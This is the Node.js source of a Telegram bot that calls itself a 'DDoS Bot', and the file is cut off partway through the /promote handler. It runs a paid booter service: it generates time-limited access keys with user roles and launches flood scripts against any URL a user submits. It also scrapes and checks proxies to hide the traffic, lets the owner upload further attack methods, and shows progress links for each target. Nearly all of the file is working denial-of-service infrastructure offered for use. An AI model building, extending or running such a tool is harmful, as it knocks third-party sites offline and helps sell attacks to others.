const fs = require('fs').promises;
const fsSync = require('fs');
const path = require('path');
const { spawn, exec } = require('child_process'); // added exec
const TelegramBot = require('node-telegram-bot-api');
const crypto = require('crypto');
const axios = require('axios');
const net = require('net');
const { scrapeProxies } = require('./proxies.js');

// ---------- HARDCODED CONFIGURATION ----------
const BOT_TOKEN = 'Enter_BOT_token';        // <--  ផ្លាសប្តូ your bot token
const OWNER_ID = Enter_chat_id;                     // <-- ផ្លាស់ប្តូ chat id
const SCRIPT_DIR = __dirname;
const PROXY_DIR = __dirname;
const METHODS_DIR = path.join(__dirname, 'methods');
const DEFAULT_PROXY_FILE = 'proxy.txt';
const ATTACK_ANIMATION_URL = 'https://e.top4top.io/m_3728a0ce61.mp4'; // only for /attack
const DATA_FILE = path.join(__dirname, 'bot_data.json');

// Ensure methods directory exists
if (!fsSync.existsSync(METHODS_DIR)) {
  fsSync.mkdirSync(METHODS_DIR);
}

// Built-in methods (cannot be deleted)
const BUILTIN_METHODS = {
  zaher: 'zaher.js',
  zaherH2: 'zaherH2.js',
  cfzaher: 'cfzaher.js',
  L4: 'L4.js'
};

// Role-based limits
const ROLE_LIMITS = {
  normal: {
    maxTime: 300,
    maxRps: 1000,
    maxThreads: 50,
    maxConcurrent: 2
  },
  vip: {
    maxTime: 3600,
    maxRps: 5000,
    maxThreads: 200,
    maxConcurrent: 10
  }
};
// -----------------------------------

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// ---------- Data Store ----------
class DataStore {
  constructor(file) {
    this.file = file;
    this.data = { users: {}, keys: {}, methods: {} };
  }

  async load() {
    try {
      const raw = await fs.readFile(this.file, 'utf8');
      this.data = JSON.parse(raw);
      if (!this.data.methods) this.data.methods = {};
    } catch (err) {
      if (err.code !== 'ENOENT') console.error('Failed to load data:', err);
      this.data = { users: {}, keys: {}, methods: {} };
      await this.save();
    }
  }

  async save() {
    try {
      await fs.writeFile(this.file, JSON.stringify(this.data, null, 2));
    } catch (err) {
      console.error('Failed to save data:', err);
    }
  }

  getUser(userId) {
    const user = this.data.users[userId];
    if (!user) return null;
    if (user.expires < Date.now()) {
      delete this.data.users[userId];
      this.save();
      return null;
    }
    return user;
  }

  addUser(userId, expires, role = 'normal') {
    this.data.users[userId] = { expires, role };
    this.save();
  }

  updateUserRole(userId, role) {
    if (this.data.users[userId]) {
      this.data.users[userId].role = role;
      this.save();
    }
  }

  removeUser(userId) {
    delete this.data.users[userId];
    this.save();
  }

  getAllUsers() {
    return Object.entries(this.data.users).map(([id, data]) => ({
      id: parseInt(id),
      ...data
    }));
  }

  getKey(key) {
    return this.data.keys[key];
  }

  addKey(key, expires, role = 'normal') {
    this.data.keys[key] = { expires, role };
    this.save();
  }

  deleteKey(key) {
    delete this.data.keys[key];
    this.save();
  }

  // Method management
  addMethod(name, fileName) {
    this.data.methods[name] = fileName;
    this.save();
  }

  removeMethod(name) {
    delete this.data.methods[name];
    this.save();
  }

  getMethodFile(name) {
    return this.data.methods[name];
  }

  getAllMethods() {
    return { ...BUILTIN_METHODS, ...this.data.methods };
  }
}

const db = new DataStore(DATA_FILE);

// ---------- Attack Manager ----------
class AttackManager {
  constructor() {
    this.attacks = new Map();
    this.nextId = 1;
  }

  add(attack) {
    const id = this.nextId++;
    this.attacks.set(id, { ...attack, id });
    return id;
  }

  get(id) {
    return this.attacks.get(id);
  }

  delete(id) {
    return this.attacks.delete(id);
  }

  list() {
    return Array.from(this.attacks.values());
  }

  listByUser(userId) {
    return this.list().filter(a => a.userId === userId);
  }

  stopAll() {
    for (const attack of this.attacks.values()) {
      try {
        attack.child.kill();
      } catch (e) {}
    }
    this.attacks.clear();
  }
}

const attackManager = new AttackManager();

// ---------- Role Helpers ----------
function getUserRole(userId) {
  if (userId === OWNER_ID) return 'owner';
  const user = db.getUser(userId);
  return user ? user.role : null;
}

function checkAttackLimits(userId, method, target, time, rps, threads) {
  const role = getUserRole(userId);
  if (role === 'owner') return null;

  const limits = ROLE_LIMITS[role];
  if (!limits) return '❌ Your account has no valid role. Contact owner.';

  const timeNum = parseInt(time, 10);
  const rpsNum = parseInt(rps, 10);
  const threadsNum = parseInt(threads, 10);

  if (timeNum > limits.maxTime) {
    return `❌ Time exceeds your limit (max ${limits.maxTime}s for ${role} users).`;
  }
  if (rpsNum > limits.maxRps) {
    return `❌ RPS exceeds your limit (max ${limits.maxRps} for ${role} users).`;
  }
  if (threadsNum > limits.maxThreads) {
    return `❌ Threads exceeds your limit (max ${limits.maxThreads} for ${role} users).`;
  }

  const userAttacks = attackManager.listByUser(userId).length;
  if (userAttacks >= limits.maxConcurrent) {
    return `❌ You have reached your concurrent attack limit (${limits.maxConcurrent}). Stop an existing attack first.`;
  }

  return null;
}

// ---------- Validation (with proper file check) ----------
function validateAttackParams(method, target, time, rps, threads, proxyFile) {
  const allMethods = db.getAllMethods();
  if (!allMethods[method]) {
    const available = Object.keys(allMethods).join(', ');
    return `❌ Invalid method: ${method}. Available: ${available}`;
  }
  try {
    new URL(target);
  } catch {
    return `❌ Invalid URL: ${target}. Must be a valid URL (include http:// or https://)`;
  }
  const timeNum = parseInt(time, 10);
  if (isNaN(timeNum) || timeNum <= 0) return `❌ Invalid time: ${time}. Must be positive number (seconds)`;
  const rpsNum = parseInt(rps, 10);
  if (isNaN(rpsNum) || rpsNum <= 0) return `❌ Invalid RPS: ${rps}. Must be positive number`;
  const threadsNum = parseInt(threads, 10);
  if (isNaN(threadsNum) || threadsNum <= 0) return `❌ Invalid threads: ${threads}. Must be positive number`;

  const proxyPath = proxyFile ? path.join(PROXY_DIR, proxyFile) : path.join(PROXY_DIR, DEFAULT_PROXY_FILE);
  try {
    fsSync.accessSync(proxyPath, fsSync.constants.R_OK);
  } catch {
    return `❌ Proxy file not found or not readable: ${proxyFile || DEFAULT_PROXY_FILE}. Run /listproxies to see available files.`;
  }
  return null;
}

function getScriptPath(method) {
  const allMethods = db.getAllMethods();
  const fileName = allMethods[method];
  if (BUILTIN_METHODS[method]) {
    return path.join(SCRIPT_DIR, fileName);
  } else {
    return path.join(METHODS_DIR, fileName);
  }
}

// ---------- Authorization Middleware ----------
async function requireAuth(msg) {
  const userId = msg.from.id;
  if (userId === OWNER_ID) return true;
  const user = db.getUser(userId);
  if (!user) {
    await bot.sendMessage(msg.chat.id,
      '🔑 *Access Denied*\nYou need a valid key.\nUse /activate <key>',
      { parse_mode: 'Markdown' }
    );
    return false;
  }
  return true;
}

// ---------- Proxy Checker Function ----------
async function checkProxyFile(inputFile, outputFile, progressCallback) {
  let proxies;
  try {
    const data = await fs.readFile(inputFile, 'utf8');
    proxies = data.split('\n').map(line => line.trim()).filter(line => line);
  } catch (err) {
    throw new Error(`Cannot read input file: ${inputFile}`);
  }

  const total = proxies.length;
  let alive = 0;
  let dead = 0;
  const results = [];

  const tcpCheck = (host, port) => {
    return new Promise((resolve) => {
      const socket = new net.Socket();
      const timeout = setTimeout(() => {
        socket.destroy();
        resolve(false);
      }, 2000);

      socket.once('connect', () => {
        clearTimeout(timeout);
        socket.destroy();
        resolve(true);
      });

      socket.once('error', () => {
        clearTimeout(timeout);
        socket.destroy();
        resolve(false);
      });

      socket.connect(port, host);
    });
  };

  const httpCheck = async (proxy) => {
    const [host, port] = proxy.split(':');
    try {
      const response = await axios.get('http://httpbin.org/get', {
        proxy: { host, port: parseInt(port, 10) },
        timeout: 3000
      });
      return response.status === 200;
    } catch {
      return false;
    }
  };

  const checkOne = async (proxy) => {
    const [host, port] = proxy.split(':');
    const tcpOk = await tcpCheck(host, parseInt(port, 10));
    if (!tcpOk) {
      dead++;
      if (progressCallback) progressCallback(alive, dead, total);
      return;
    }
    const httpOk = await httpCheck(proxy);
    if (httpOk) {
      alive++;
      results.push(proxy);
    } else {
      dead++;
    }
    if (progressCallback) progressCallback(alive, dead, total);
  };

  const CONCURRENT = 500;
  for (let i = 0; i < proxies.length; i += CONCURRENT) {
    const batch = proxies.slice(i, i + CONCURRENT);
    await Promise.all(batch.map(proxy => checkOne(proxy)));
  }

  await fs.writeFile(outputFile, results.join('\n'));
  return { alive, dead, total };
}

// ---------- Command Handlers ----------
const commands = new Map();

// /start
commands.set('/start', async (msg) => {
  if (!await requireAuth(msg)) return;
  await bot.sendMessage(msg.chat.id,
    `👋 *Welcome to DDoS Bot*\n\n` +
    `📝 *Quick Commands:*\n` +
    `/attack - Launch an attack\n` +
    `/list - Show active attacks\n` +
    `/stop <id> - Stop an attack\n` +
    `/stopall - Stop all active attacks\n` +
    `/scrape - Update proxy list\n` +
    `/checkproxy - Test and clean proxy file\n` +
    `/uploadproxy - Upload your own proxy file\n` +
    `/listproxies - Show available proxy files\n` +
    `/addmethod - (Owner) Upload a new attack method (.js)\n` +
    `/delmethod <name> - (Owner) Remove a user-added method\n` +
    `/npm <requirement> - (Owner) Install npm dependencies in methods folder\n\n` +
    `ℹ️ *More Info:*\n` +
    `/help - Full usage guide\n` +
    `/methods - Available attack methods\n` +
    `👑 *Owner only* – /panel`,
    { parse_mode: 'Markdown' }
  );
});

// /help
commands.set('/help', async (msg) => {
  if (!await requireAuth(msg)) return;
  const role = getUserRole(msg.from.id);
  const limits = role === 'owner' ? 'No limits' : ROLE_LIMITS[role];
  const limitsText = role === 'owner' 
    ? '∞ (owner)' 
    : `Max time: ${limits.maxTime}s\nMax RPS: ${limits.maxRps}\nMax threads: ${limits.maxThreads}\nMax concurrent: ${limits.maxConcurrent}`;

  await bot.sendMessage(msg.chat.id,
    `📖 *Complete Usage Guide*\n\n` +
    `*1. ATTACK COMMAND*\n` +
    `\`/attack <method> <url> <time> <rps> <threads> [proxyfile]\`\n\n` +
    `📌 *Parameters:*\n` +
    `  • method: any built-in or user-added method (see /methods)\n` +
    `  • url: Target URL (https://example.com)\n` +
    `  • time: Duration in seconds\n` +
    `  • rps: Requests per second\n` +
    `  • threads: Number of threads\n` +
    `  • proxyfile: Optional proxy file (default: ${DEFAULT_PROXY_FILE})\n\n` +
    `✅ *Example:*\n` +
    `\`/attack zaher https://example.com 60 500 10\`\n\n` +
    `*2. MANAGE ATTACKS*\n` +
    `\`/list\` - View all active attacks\n` +
    `\`/stop <id>\` - Stop a specific attack\n` +
    `\`/stopall\` - Stop all active attacks\n\n` +
    `*3. PROXIES*\n` +
    `\`/scrape\` - Fetch fresh proxies\n` +
    `\`/checkproxy [filename]\` - Test and clean a proxy file\n` +
    `\`/uploadproxy\` - Upload your own proxy file (send as document)\n` +
    `\`/listproxies\` - List all available proxy files\n\n` +
    `*4. METHODS*\n` +
    `\`/methods\` - Show available attack methods\n` +
    `\`/addmethod\` - (Owner) Upload a new attack method (.js)\n` +
    `\`/delmethod <name>\` - (Owner) Remove a user-added method\n` +
    `\`/npm <requirement>\` - (Owner) Install npm dependencies in methods folder\n\n` +
    `*5. YOUR LIMITS (${role})*\n` +
    `${limitsText}\n\n` +
    `*6. OWNER PANEL*\n` +
    `If you are the owner, use /panel to see admin commands.`,
    { parse_mode: 'Markdown' }
  );
});

// /methods
commands.set('/methods', async (msg) => {
  if (!await requireAuth(msg)) return;
  const allMethods = db.getAllMethods();
  const builtInList = Object.keys(BUILTIN_METHODS).join(', ');
  const userMethods = Object.keys(db.data.methods);
  const userList = userMethods.length ? userMethods.join(', ') : '(none)';
  await bot.sendMessage(msg.chat.id,
    `📋 *Available attack methods:*\n\n` +
    `*Built-in:*\n\`${builtInList}\`\n\n` +
    `*User-added:*\n\`${userList}\``,
    { parse_mode: 'Markdown' }
  );
});

// /addmethod
commands.set('/addmethod', async (msg) => {
  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(msg.chat.id, '⛔ Owner only', { parse_mode: 'Markdown' });
  }
  await bot.sendMessage(msg.chat.id,
    '📤 Please send the JavaScript file for the new method as a document.',
    { parse_mode: 'Markdown' }
  );
});

// /delmethod
commands.set('/delmethod', async (msg) => {
  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(msg.chat.id, '⛔ Owner only', { parse_mode: 'Markdown' });
  }
  const args = msg.text.split(' ').slice(1);
  if (args.length === 0) {
    return bot.sendMessage(msg.chat.id, '❌ Usage: /delmethod <method_name>', { parse_mode: 'Markdown' });
  }
  const methodName = args[0];
  if (BUILTIN_METHODS[methodName]) {
    return bot.sendMessage(msg.chat.id, '❌ Cannot delete built-in method.', { parse_mode: 'Markdown' });
  }
  const fileName = db.getMethodFile(methodName);
  if (!fileName) {
    return bot.sendMessage(msg.chat.id, `❌ Method \`${methodName}\` not found.`, { parse_mode: 'Markdown' });
  }
  const filePath = path.join(METHODS_DIR, fileName);
  try {
    await fs.unlink(filePath);
  } catch (err) {
    console.error(`Failed to delete method file: ${err.message}`);
  }
  db.removeMethod(methodName);
  await bot.sendMessage(msg.chat.id, `✅ Method \`${methodName}\` removed.`, { parse_mode: 'Markdown' });
});

// /installmethods – NEW COMMAND
commands.set('/npm', async (msg) => {
  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(msg.chat.id, '⛔ Owner only', { parse_mode: 'Markdown' });
  }
  const statusMsg = await bot.sendMessage(msg.chat.id, '📦 Installing npm packages in methods directory...', { parse_mode: 'Markdown' });
  exec('npm install', { cwd: METHODS_DIR }, (error, stdout, stderr) => {
    if (error) {
      bot.editMessageText(`❌ Installation failed:\n\`\`\`\n${error.message}\n\`\`\``, { chat_id: msg.chat.id, message_id: statusMsg.message_id, parse_mode: 'Markdown' }).catch(() => {});
      return;
    }
    const output = stdout || stderr || 'No output';
    bot.editMessageText(`✅ npm install completed.\n\`\`\`\n${output.substring(0, 1000)}\n\`\`\``, { chat_id: msg.chat.id, message_id: statusMsg.message_id, parse_mode: 'Markdown' }).catch(() => {});
  });
});

// /scrape
commands.set('/scrape', async (msg) => {
  if (!await requireAuth(msg)) return;
  const statusMsg = await bot.sendMessage(msg.chat.id, '🔄 Starting proxy scraper...');
  let lastUpdate = Date.now();

  const progressCallback = async (processed, total, found) => {
    if (Date.now() - lastUpdate > 3000) {
      await bot.editMessageText(
        `🔄 Scraping progress: ${processed}/${total} sources processed\n📦 Proxies found so far: ${found}`,
        { chat_id: msg.chat.id, message_id: statusMsg.message_id }
      ).catch(() => {});
      lastUpdate = Date.now();
    }
  };

  try {
    const count = await scrapeProxies(progressCallback, path.join(PROXY_DIR, DEFAULT_PROXY_FILE));
    await bot.editMessageText(
      `✅ Scraping complete!\n📦 Total unique proxies: ${count}\nSaved to \`${DEFAULT_PROXY_FILE}\``,
      { chat_id: msg.chat.id, message_id: statusMsg.message_id, parse_mode: 'Markdown' }
    );
  } catch (err) {
    await bot.editMessageText(
      `❌ Scraping failed: ${err.message}`,
      { chat_id: msg.chat.id, message_id: statusMsg.message_id }
    );
  }
});

// /checkproxy
commands.set('/checkproxy', async (msg) => {
  if (!await requireAuth(msg)) return;
  const chatId = msg.chat.id;
  const args = msg.text.split(' ').slice(1);
  let inputFile = args[0] || DEFAULT_PROXY_FILE;
  const inputPath = path.join(PROXY_DIR, inputFile);

  try {
    fsSync.accessSync(inputPath, fsSync.constants.R_OK);
  } catch {
    return bot.sendMessage(chatId, `❌ File \`${inputFile}\` not found or not readable.`, { parse_mode: 'Markdown' });
  }

  const statusMsg = await bot.sendMessage(chatId, `🔍 Checking proxies in \`${inputFile}\`...`, { parse_mode: 'Markdown' });

  const parsed = path.parse(inputFile);
  const outputFile = `${parsed.name}_checked${parsed.ext}`;
  const outputPath = path.join(PROXY_DIR, outputFile);

  let lastUpdate = Date.now();
  const progressCallback = (alive, dead, total) => {
    if (Date.now() - lastUpdate > 2000) {
      bot.editMessageText(
        `🔍 Checking: ${alive + dead}/${total} processed | Alive: ${alive} | Dead: ${dead}`,
        { chat_id: chatId, message_id: statusMsg.message_id }
      ).catch(() => {});
      lastUpdate = Date.now();
    }
  };

  try {
    const { alive, dead, total } = await checkProxyFile(inputPath, outputPath, progressCallback);
    await bot.editMessageText(
      `✅ Check complete!\n📊 Total: ${total} | ✅ Alive: ${alive} | ❌ Dead: ${dead}\n📁 Saved to \`${outputFile}\``,
      { chat_id: chatId, message_id: statusMsg.message_id, parse_mode: 'Markdown' }
    );

    if (alive > 0) {
      await bot.sendDocument(chatId, outputPath, { caption: `✅ Working proxies (${alive})` });
    } else {
      await bot.sendMessage(chatId, '⚠️ No working proxies found.', { parse_mode: 'Markdown' });
    }
  } catch (err) {
    await bot.editMessageText(`❌ Error: ${err.message}`, { chat_id: chatId, message_id: statusMsg.message_id });
  }
});

// /listproxies
commands.set('/listproxies', async (msg) => {
  if (!await requireAuth(msg)) return;
  const chatId = msg.chat.id;
  try {
    const files = await fs.readdir(PROXY_DIR);
    const proxyFiles = files.filter(f => f.endsWith('.txt') && f !== 'bot_data.json');
    
    proxyFiles.sort((a, b) => {
      const aNum = a.match(/^proxy(\d+)\.txt$/);
      const bNum = b.match(/^proxy(\d+)\.txt$/);
      if (aNum && bNum) return parseInt(aNum[1]) - parseInt(bNum[1]);
      if (aNum) return -1;
      if (bNum) return 1;
      return a.localeCompare(b);
    });

    if (proxyFiles.length === 0) {
      return bot.sendMessage(chatId, '📭 No proxy files found.', { parse_mode: 'Markdown' });
    }
    let response = `📋 *Available proxy files:*\n\n`;
    for (const file of proxyFiles) {
      const stat = await fs.stat(path.join(PROXY_DIR, file));
      const lines = (await fs.readFile(path.join(PROXY_DIR, file), 'utf8')).split('\n').filter(l => l.trim()).length;
      response += `📄 \`${file}\` – ${lines} proxies, ${(stat.size / 1024).toFixed(1)} KB\n`;
    }
    await bot.sendMessage(chatId, response, { parse_mode: 'Markdown' });
  } catch (err) {
    bot.sendMessage(chatId, `❌ Error: ${err.message}`);
  }
});

// /attack
commands.set('/attack', async (msg) => {
  if (!await requireAuth(msg)) return;
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  const args = msg.text.split(' ').slice(1);
  if (args.length < 5) {
    return bot.sendMessage(
      chatId,
      `❌ *Invalid attack command*\n\n` +
      `*Format:*\n\`/attack <method> <url> <time> <rps> <threads> [proxyfile]\`\n\n` +
      `*Example:*\n\`/attack zaher https://example.com 60 500 10\`\n\n` +
      `Use /help for more details`,
      { parse_mode: 'Markdown' }
    );
  }

  let [method, target, time, rps, threads, proxyFile] = args;
  if (args.length === 5) proxyFile = null;

  const paramError = validateAttackParams(method, target, time, rps, threads, proxyFile);
  if (paramError) return bot.sendMessage(chatId, paramError, { parse_mode: 'Markdown' });

  const limitError = checkAttackLimits(userId, method, target, time, rps, threads);
  if (limitError) return bot.sendMessage(chatId, limitError, { parse_mode: 'Markdown' });

  const proxyPath = proxyFile
    ? path.join(PROXY_DIR, proxyFile)
    : path.join(PROXY_DIR, DEFAULT_PROXY_FILE);

  const scriptPath = getScriptPath(method);
  // Check if script exists
  try {
    fsSync.accessSync(scriptPath, fsSync.constants.R_OK);
  } catch {
    return bot.sendMessage(chatId, `❌ Attack script not found: ${method}. Please contact owner.`, { parse_mode: 'Markdown' });
  }

  const scriptArgs = [target, time, rps, threads, proxyPath];

  const child = spawn('node', [scriptPath, ...scriptArgs], {
    cwd: SCRIPT_DIR,
    stdio: ['ignore', 'pipe', 'pipe']
  });

  const attackId = attackManager.add({
    pid: child.pid,
    method,
    target,
    time: parseInt(time, 10),
    rps: parseInt(rps, 10),
    threads: parseInt(threads, 10),
    proxyFile: proxyFile || DEFAULT_PROXY_FILE,
    chatId,
    userId,
    startTime: Date.now(),
    child
  });

  const checkHostUrl = `https://check-host.net/check-http?host=${encodeURIComponent(target)}`;
  const caption = `🚀 *Attack started*\n` +
    `ID: \`${attackId}\`\n` +
    `Method: ${method}\n` +
    `Target: ${target}\n` +
    `Time: ${time}s\n` +
    `RPS: ${rps}\n` +
    `Threads: ${threads}\n` +
    `Proxy: ${proxyFile || DEFAULT_PROXY_FILE}\n` +
    `Check Host: [Check-Host](${checkHostUrl})`;

  const sentMsg = await bot.sendAnimation(chatId, ATTACK_ANIMATION_URL, { caption, parse_mode: 'Markdown' })
    .catch(() => bot.sendMessage(chatId, caption, { parse_mode: 'Markdown' }));

  const attack = attackManager.get(attackId);
  if (attack) attack.messageId = sentMsg.message_id;

  child.stdout.on('data', data => console.log(`[${new Date().toISOString()}] [Attack ${attackId}] stdout: ${data}`));
  child.stderr.on('data', data => console.error(`[${new Date().toISOString()}] [Attack ${attackId}] stderr: ${data}`));

  child.on('exit', (code, signal) => {
    const attack = attackManager.get(attackId);
    if (!attack) return;

    const duration = Math.round((Date.now() - attack.startTime) / 1000);
    const status = code === 0 ? '✅ Completed' : `❌ Crashed (code ${code}${signal ? ' signal ' + signal : ''})`;

    bot.editMessageText(
      `🚀 *Attack finished*\n` +
      `ID: \`${attackId}\`\n` +
      `Method: ${attack.method}\n` +
      `Target: ${attack.target}\n` +
      `Duration: ${duration}s\n` +
      `Status: ${status}`,
      {
        chat_id: attack.chatId,
        message_id: attack.messageId,
        parse_mode: 'Markdown'
      }
    ).catch(() => {});

    attackManager.delete(attackId);
  });

  setTimeout(() => {
    const attack = attackManager.get(attackId);
    if (attack) attack.child.kill();
  }, (parseInt(time, 10) + 5) * 1000);
});

// /list
commands.set('/list', async (msg) => {
  if (!await requireAuth(msg)) return;
  const attacks = attackManager.list();
  if (attacks.length === 0) {
    return bot.sendMessage(msg.chat.id, '📭 *No active attacks*', { parse_mode: 'Markdown' });
  }

  let response = `📋 *Active Attacks (${attacks.length})*\n\n`;
  for (const attack of attacks) {
    const runningFor = Math.round((Date.now() - attack.startTime) / 1000);
    const timeLeft = Math.max(0, attack.time - runningFor);
    const progress = Math.round((runningFor / attack.time) * 100);
    response += `🆔 ID: \`${attack.id}\`\n`;
    response += `🎯 Target: ${attack.target}\n`;
    response += `⚙️ Method: ${attack.method}\n`;
    response += `👤 Started by: \`${attack.userId}\`\n`;
    response += `⏱️ Progress: ${runningFor}/${attack.time}s (${progress}%)\n`;
    response += `⏳ Time left: ${timeLeft}s\n\n`;
  }
  await bot.sendMessage(msg.chat.id, response, { parse_mode: 'Markdown' });
});

// /stop
commands.set('/stop', async (msg) => {
  if (msg.from.id !== OWNER_ID && !await requireAuth(msg)) return;

  const args = msg.text.split(' ').slice(1);
  if (args.length === 0) {
    return bot.sendMessage(msg.chat.id, '❌ Usage: /stop <attack_id>', { parse_mode: 'Markdown' });
  }
  const attackId = parseInt(args[0], 10);
  if (isNaN(attackId)) {
    return bot.sendMessage(msg.chat.id, '❌ Invalid attack ID. Must be a number.', { parse_mode: 'Markdown' });
  }

  const attack = attackManager.get(attackId);
  if (!attack) {
    return bot.sendMessage(msg.chat.id, `❌ No active attack with ID ${attackId}`, { parse_mode: 'Markdown' });
  }

  if (msg.from.id !== OWNER_ID && attack.userId !== msg.from.id) {
    return bot.sendMessage(msg.chat.id, '⛔ You can only stop your own attacks.', { parse_mode: 'Markdown' });
  }

  try {
    attack.child.kill();
  } catch (err) {
    console.error(`Error killing attack ${attackId}:`, err);
  }

  const duration = Math.round((Date.now() - attack.startTime) / 1000);
  attackManager.delete(attackId);

  await bot.sendMessage(
    msg.chat.id,
    `🛑 *Attack stopped*\nID: \`${attackId}\`\nTarget: ${attack.target}\nDuration: ${duration}s`,
    { parse_mode: 'Markdown' }
  );
});

// /stopall
commands.set('/stopall', async (msg) => {
  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(msg.chat.id, '⛔ Owner only', { parse_mode: 'Markdown' });
  }
  const count = attackManager.list().length;
  if (count === 0) {
    return bot.sendMessage(msg.chat.id, '📭 No active attacks to stop.', { parse_mode: 'Markdown' });
  }
  attackManager.stopAll();
  await bot.sendMessage(msg.chat.id, `🛑 Stopped all ${count} active attacks.`, { parse_mode: 'Markdown' });
});

// /genkey
commands.set('/genkey', async (msg) => {
  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(msg.chat.id, '⛔ Owner only', { parse_mode: 'Markdown' });
  }
  const args = msg.text.split(' ').slice(1);
  if (args.length < 1) {
    return bot.sendMessage(msg.chat.id, '❌ Usage: /genkey <hours> [role]', { parse_mode: 'Markdown' });
  }
  const hours = parseInt(args[0], 10);
  if (isNaN(hours) || hours <= 0) {
    return bot.sendMessage(msg.chat.id, '❌ Hours must be a positive number.', { parse_mode: 'Markdown' });
  }
  let role = 'normal';
  if (args.length >= 2) {
    role = args[1].toLowerCase();
    if (role !== 'vip' && role !== 'normal') {
      return bot.sendMessage(msg.chat.id, '❌ Role must be `vip` or `normal`.', { parse_mode: 'Markdown' });
    }
  }

  const randomPart = crypto.randomBytes(4).toString('hex');
  const key = `zaher_${randomPart}`;
  const expires = Date.now() + hours * 3600000;
  db.addKey(key, expires, role);

  await bot.sendMessage(
    msg.chat.id,
    `✅ *Key generated*\nKey: \`${key}\`\nRole: ${role}\nExpires: ${new Date(expires).toLocaleString()}\nDuration: ${hours} hour(s)`,
    { parse_mode: 'Markdown' }
  );
});

// /activate
commands.set('/activate', async (msg) => {
  const args = msg.text.split(' ').slice(1);
  if (args.length === 0) {
    return bot.sendMessage(msg.chat.id, '❌ Usage: /activate <key>', { parse_mode: 'Markdown' });
  }
  const key = args[0];
  const keyData = db.getKey(key);
  if (!keyData) {
    return bot.sendMessage(msg.chat.id, '❌ Invalid key.', { parse_mode: 'Markdown' });
  }
  if (keyData.expires < Date.now()) {
    db.deleteKey(key);
    return bot.sendMessage(msg.chat.id, '❌ Key expired.', { parse_mode: 'Markdown' });
  }

  db.addUser(msg.from.id, keyData.expires, keyData.role);
  db.deleteKey(key);
  await bot.sendMessage(
    msg.chat.id,
    `✅ *Activation successful!*\nYour role: ${keyData.role}\nAccess expires on: ${new Date(keyData.expires).toLocaleString()}`,
    { parse_mode: 'Markdown' }
  );
});

// /restart
commands.set('/restart', async (msg) => {
  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(msg.chat.id, '⛔ Owner only', { parse_mode: 'Markdown' });
  }
  await bot.sendMessage(msg.chat.id, '🔄 Restarting bot...', { parse_mode: 'Markdown' });
  attackManager.stopAll();
  setTimeout(() => process.exit(0), 1000);
});

// /panel
commands.set('/panel', async (msg) => {
  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(msg.chat.id, '⛔ Owner only', { parse_mode: 'Markdown' });
  }
  const text = 
    `👑 *Owner Panel*\n\n` +
    `*User Management*\n` +
    `/users - List all users\n` +
    `/revoke <user_id> - Remove a user\n` +
    `/promote <user_id> [vip|normal] - Change user role\n` +
    `/genkey <hours> [role] - Generate key (role: normal/vip, default normal)\n\n` +
    `*Broadcast*\n` +
    `/broadcast <message> - Send message to all users\n\n` +
    `*Statistics*\n` +
    `/stats - Bot statistics\n\n` +
    `*Methods*\n` +
    `/addmethod - Upload a new attack method (.js)\n` +
    `/delmethod <name> - Remove a user-added method\n` +
    `/npm <requirement> - Install npm dependencies in methods folder\n\n` +
    `*System*\n` +
    `/restart - Restart bot`;
  await bot.sendMessage(msg.chat.id, text, { parse_mode: 'Markdown' });
});

// /users
commands.set('/users', async (msg) => {
  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(msg.chat.id, '⛔ Owner only', { parse_mode: 'Markdown' });
  }
  const users = db.getAllUsers();
  if (users.length === 0) {
    return bot.sendMessage(msg.chat.id, '📭 No users found.', { parse_mode: 'Markdown' });
  }
  let response = `📋 *Registered Users (${users.length})*\n\n`;
  for (const user of users) {
    const expiry = new Date(user.expires).toLocaleString();
    response += `🆔 \`${user.id}\`\n`;
    response += `Role: ${user.role}\n`;
    response += `Expires: ${expiry}\n`;
    const activeCount = attackManager.listByUser(user.id).length;
    response += `Active attacks: ${activeCount}\n\n`;
  }
  if (response.length > 4096) {
    const chunks = response.match(/.{1,4096}/g) || [];
    for (const chunk of chunks) {
      await bot.sendMessage(msg.chat.id, chunk, { parse_mode: 'Markdown' });
    }
  } else {
    await bot.sendMessage(msg.chat.id, response, { parse_mode: 'Markdown' });
  }
});

// /revoke
commands.set('/revoke', async (msg) => {
  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(msg.chat.id, '⛔ Owner only', { parse_mode: 'Markdown' });
  }
  const args = msg.text.split(' ').slice(1);
  if (args.length === 0) {
    return bot.sendMessage(msg.chat.id, '❌ Usage: /revoke <user_id>', { parse_mode: 'Markdown' });
  }
  const userId = parseInt(args[0], 10);
  if (isNaN(userId)) {
    return bot.sendMessage(msg.chat.id, '❌ Invalid user ID.', { parse_mode: 'Markdown' });
  }
  const user = db.getUser(userId);
  if (!user) {
    return bot.sendMessage(msg.chat.id, `❌ User ${userId} not found.`, { parse_mode: 'Markdown' });
  }
  db.removeUser(userId);
  const userAttacks = attackManager.listByUser(userId);
  for (const attack of userAttacks) {
    try { attack.child.kill(); } catch (e) {}
    attackManager.delete(attack.id);
  }
  await bot.sendMessage(msg.chat.id, `✅ Revoked access for user \`${userId}\`.`, { parse_mode: 'Markdown' });
});

// /promote
commands.set('/promote', async (msg) => {
  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(msg.chat.id, '⛔ Owner only', { parse_mode: 'Markdown' });
  }
  const args = msg.text.split(' ').slice(1);
  if (args.length < 2) {
    return bot.sendMessage(msg.chat.id, '❌ Usage: /promote <user_id> [vip|normal]', { parse_mode: 'Markdown' });
  }
  const userId = parseInt(args[0], 10);
  if (isNaN(userId)) {
    return bot.sendMessage(msg.chat.id, '❌ Invalid user ID.', { parse_mode: 'Markdown' });
  }
  const role = args[1].toLowerCase();
  if (role !== 'vip' && role !== 'normal') {
    return bot.sendMessage(msg.chat.id, '❌ Role must be `vip` or `normal`.', { parse_mode: 'Markdown' });
  }
  const user = db.getUser(userId);
  if (!user) {
    return bot.sendMessage(msg.chat.id, `❌ User ${userId} not found.`, { parse_mode: 'Markdown' });
  }
  db.updateUserRole(userId, role);
  await bot.sendMessage(msg.chat.id, `✅ User \`${userId}\` is now **${role}**.`, { parse_mode: 'Markdown' });
